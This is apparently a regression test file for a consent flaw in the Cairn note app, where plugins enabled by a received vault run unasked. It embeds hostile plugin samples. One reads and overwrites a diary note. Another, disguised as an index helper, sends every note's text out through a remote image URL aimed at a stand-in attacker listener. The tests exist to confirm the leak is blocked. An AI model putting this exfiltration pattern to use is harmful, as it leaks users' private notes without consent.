// Regression tests for FINDING-005 (plugins enabled in .cairn/settings.json
// started without consent), against the real app.
//
//   scripts/e2e-headless.sh e2e/adv_verify_pl_01.test.mjs
//
// Test 1 is the bare case: a plugin from a received vault must not run with
// read+write unless a dialog asks first. (Such a plugin must stay off until
// it is turned on on this device.)
// Test 2 is the impact case: a "starter" vault from someone else carries a
// plugin. The user later writes a private note in that vault. The plugin,
// never approved, must not read it and write a note with a remote https
// image whose URL carries the secret. With the defect it did, and opening
// that note made Live Preview load the image (CSP img-src allows https:), so
// the secret left the machine. Locally the server only sees a TLS connection
// (no trusted cert), which is enough to show whether the request is made; a
// real attacker with a valid certificate would receive the full URL.

import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import net from "node:net";
import path from "node:path";
import { setTimeout as sleep } from "node:timers/promises";
import { startDriver, Session, Key } from "./webdriver.mjs";

const APP = path.resolve(import.meta.dirname, "../target/debug/cairn");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "cairn-verify-pl01-"));
let drv, s, tcp, PORT;
const conns = [];
let n = 0;

function makeVault(name, files) {
  const dir = path.join(tmp, `${++n}-${name}`);
  const v = {
    dir,
    write(rel, c) {
      const p = path.join(dir, rel);
      fs.mkdirSync(path.dirname(p), { recursive: true });
      fs.writeFileSync(p, c);
    },
    read: (rel) => fs.readFileSync(path.join(dir, rel), "utf8"),
    exists: (rel) => fs.existsSync(path.join(dir, rel)),
  };
  fs.mkdirSync(dir, { recursive: true });
  for (const [k, c] of Object.entries(files)) v.write(k, c);
  return v;
}

async function eventually(fn, { timeout = 6000, message = "condition" } = {}) {
  const end = Date.now() + timeout;
  while (Date.now() < end) {
    try {
      const r = await fn();
      if (r) return r;
    } catch {}
    await sleep(100);
  }
  throw new Error(`timed out: ${message}`);
}

const dialogOpen = () => s.exec(`return !!document.querySelector('[data-testid=dialog-ok]')`);

async function escapeAll() {
  for (let i = 0; i < 3; i++) {
    await s.keys(Key.escape);
    await sleep(60);
  }
}

async function switchTo(v) {
  await escapeAll();
  await s.keys({ chord: [Key.ctrl, "p"] });
  await s.type(await s.findWait("[data-testid=palette-input]"), "Switch vault");
  await sleep(150);
  await s.keys(Key.enter);
  const input = await s.findWait("[data-testid=vault-path]", 8000);
  await s.type(input, v.dir);
  await s.click(await s.find("[data-testid=vault-open]"));
}

before(async () => {
  tcp = net.createServer((sock) => {
    conns.push(Date.now());
    sock.on("error", () => {});
    sock.destroy();
  });
  await new Promise((r) => tcp.listen(0, "127.0.0.1", r));
  PORT = tcp.address().port;
  const home = makeVault("home", { "Home.md": "# Home\n", ".cairn/settings.json": JSON.stringify({ plugins: [] }) });
  drv = await startDriver(4444, {
    XDG_CONFIG_HOME: path.join(tmp, "config"),
    XDG_DATA_HOME: path.join(tmp, "data"),
    XDG_CACHE_HOME: path.join(tmp, "cache"),
  });
  s = await Session.create(drv.port, APP, [home.dir]);
  await s.waitFor(`return document.querySelectorAll('[data-testid=tree-row]').length >= 1`, { timeout: 15000 });
  await s.exec(`window.__csp = []; document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(e.violatedDirective + " " + e.blockedURI));`);
});

after(async () => {
  await s?.close();
  drv?.proc.kill();
  tcp?.close();
  fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
});

test("a plugin enabled only by a received vault's settings.json does not run without asking", async () => {
  const v = makeVault("received", {
    "Diary.md": "my private diary\n",
    ".cairn/settings.json": JSON.stringify({ plugins: ["helper.js"] }),
    ".cairn/plugins/helper.js": `// @name Helper
// @permissions read write
(async () => {
  const text = await cairn.notes.read("Diary.md");
  await cairn.notes.write("Diary.md", "changed by an auto-started plugin\\n");
  await cairn.notes.write("Copied.md", text);
})();
`,
  });
  await switchTo(v);
  // Watch for a consent dialog the whole time the plugin could be acting.
  let sawDialog = false;
  const end = Date.now() + 4000;
  while (Date.now() < end) {
    if (await dialogOpen()) sawDialog = true;
    await sleep(100);
  }
  const diary = v.read("Diary.md");
  const copied = v.exists("Copied.md") ? v.read("Copied.md") : null;
  await escapeAll();
  assert.ok(sawDialog || diary === "my private diary\n", `no dialog (seen: ${sawDialog}); Diary.md=${JSON.stringify(diary)}; Copied.md=${JSON.stringify(copied)}`);
});

test("an unapproved plugin from a starter vault cannot leak a note the user writes later", async () => {
  const v = makeVault("starter", {
    "Welcome.md": "# Welcome to the starter kit\n",
    ".cairn/settings.json": JSON.stringify({ plugins: ["daily.js"] }),
    ".cairn/plugins/daily.js": `// @name Daily helper
// @description Keeps an index of your notes.
// @permissions read write
setInterval(async () => {
  let all = "";
  for (const p of await cairn.notes.list()) {
    if (p === "Welcome.md" || p === "Index.md") continue;
    all += p + ":" + (await cairn.notes.read(p)) + ";";
  }
  if (!all) return;
  const body = "# Index\\n\\nYour notes are listed below.\\n\\n![](https://127.0.0.1:${PORT}/i.png?d=" + encodeURIComponent(all) + ")\\n";
  try { await cairn.notes.write("Index.md", body); } catch {}
}, 500);
`,
  });
  await switchTo(v);
  await s.waitFor(`return !document.querySelector('[data-testid=vault-path]') && document.querySelectorAll('[data-testid=tree-row]').length >= 1`, { timeout: 15000 });
  // Days later: the user writes a private note in this vault.
  v.write("Private.md", "bank pin 4242\n");
  const copied = await eventually(() => v.exists("Index.md") && v.read("Index.md").includes("4242"), { timeout: 6000, message: "plugin copied Private.md into Index.md" }).catch(() => false);
  const before = conns.length;
  let src = null;
  if (copied) {
    await s.click(await s.findWait('[data-testid=tree-row][data-path="Index.md"]', 8000));
    src = await eventually(
      () => s.exec(`return [...document.querySelectorAll('.cm-content img')].map((i) => i.getAttribute('src')).find((x) => x && x.includes('4242')) ?? null`),
      { timeout: 8000, message: "remote image rendered" },
    ).catch(() => null);
    await eventually(() => conns.length > before, { timeout: 5000, message: "connection to the image host" }).catch(() => {});
  }
  const csp = await s.exec(`return window.__csp`);
  const leaked = conns.length > before;
  await escapeAll();
  assert.ok(!copied, "the plugin, never approved on this device, read Private.md and copied it into Index.md");
  assert.ok(!leaked, `image src ${JSON.stringify(src)} rendered; connections to the "attacker" host: ${conns.length - before}; CSP violations: ${JSON.stringify(csp)}`);
});
